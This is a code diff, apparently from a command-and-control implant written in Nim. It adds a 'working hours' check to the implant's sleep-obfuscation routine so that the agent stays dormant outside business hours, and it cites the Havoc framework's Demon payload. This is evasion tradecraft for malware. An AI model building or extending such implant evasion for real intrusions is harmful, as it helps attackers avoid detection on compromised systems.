@@ -574,20 +574,59 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         sleep(sleepDelay)
         print "[-] ", err.msg
 
+
+# Function to determine whether the agent currently operates within the configured working hours
+proc withinWorkingHours(workingHours: WorkingHours): bool =     
+    var time: SYSTEMTIME
+    GetLocalTime(addr time)
+
+    if int(time.wHour) < workingHours.startHour or int(time.wHour) > workingHours.endHour: 
+        return false 
+
+    if int(time.wHour) == workingHours.startHour and int(time.wMinute) < workingHours.startMinute: 
+        return false 
+
+    if int(time.wHour) == workingHours.endHour and int(time.wMinute) > workingHours.endMinute:
+        return false
+
+    return true 
+
 # Sleep obfuscation implemented in various techniques
 proc sleepObfuscate*(sleepSettings: SleepSettings) = 
     
     if sleepSettings.sleepDelay == 0: 
         return 
-    
+
     # Initialize required API functions 
     let apis = initApis() 
 
     # Calculate actual sleep delay with jitter
-    let 
-        minDelay = float(sleepSettings.sleepDelay) - (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
-        maxDelay = float(sleepSettings.sleepDelay) + (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
-        delay = int(rand(minDelay .. maxDelay) * 1000)
+    let minDelay = float(sleepSettings.sleepDelay) - (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
+    let maxDelay = float(sleepSettings.sleepDelay) + (float(sleepSettings.sleepDelay) * (float(sleepSettings.jitter) / 100.0f)) 
+    
+    var delay = int(rand(minDelay .. maxDelay) * 1000)
+
+    # Working hours
+    # https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c#L650
+    # If the local time is outside of the agent's working hours, we calculate the required sleep delay until the start of the next work day.
+    if sleepSettings.workingHours.enabled and not withinWorkingHours(sleepSettings.workingHours): 
+        print "[*] Agent is outside of working hours."
+        delay = 0
+
+        # Get current time
+        var time: SYSTEMTIME
+        GetLocalTime(addr time)
+    
+        let minutesSinceMidnight = int(time.wHour) * 60 + int(time.wMinute) 
+        let minutesUntilWorkday = sleepSettings.workingHours.startHour * 60 + sleepSettings.workingHours.startMinute
+
+        if minutesSinceMidnight < minutesUntilWorkday: 
+            # We are on the same day as the start of the work day: calculate the difference between the two timestamps
+            delay = int((minutesUntilWorkday - minutesSinceMidnight) * 60 - int(time.wSecond)) * 1000
+
+        else: 
+            # Calculate minutes until midnight and add the minutes until the start of the workday
+            delay = int(((24 * 60 - minutesSinceMidnight) + minutesUntilWorkday) * 60 - int(time.wSecond)) * 1000
 
     print fmt"[*] Sleepmask settings: Technique: {$sleepSettings.sleepTechnique}, Delay: {$delay}ms, Stack spoofing: {$sleepSettings.spoofStack}"
 
